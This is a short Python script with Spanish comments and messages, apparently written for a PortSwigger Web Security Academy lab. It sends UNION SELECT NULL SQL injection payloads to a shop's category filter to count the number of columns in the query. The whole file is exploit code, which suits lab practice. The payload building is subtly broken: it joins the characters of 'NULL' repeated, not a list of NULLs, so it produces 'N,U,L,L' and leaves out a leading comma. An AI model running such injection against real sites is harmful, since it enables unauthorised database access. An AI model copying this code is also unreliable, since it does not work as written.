import requests

def obtener_columnas(URL):
    for columna in range(0,100):
        char_null = 'NULL'
        columns_num = char_null*columna
        payload = URL + "%27+UNION+SELECT+NULL{}--".format(','.join(columns_num))

        #GET /filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--
        print("Realizando peticion a: {}".format(payload))
        respuesta = requests.get(payload)
        print("Codigo de estado: {}\n".format(respuesta.status_code))

        if respuesta.status_code == 200:
            print("El numero de columna es: {}".format(columna+1))
            break

def main():
    URL = 'https://acb31f7c1ef20b1780ea160500be00ab.web-security-academy.net/filter?category=Pets'
    #Usando union
    obtener_columnas(URL)

if __name__ == "__main__":
    main()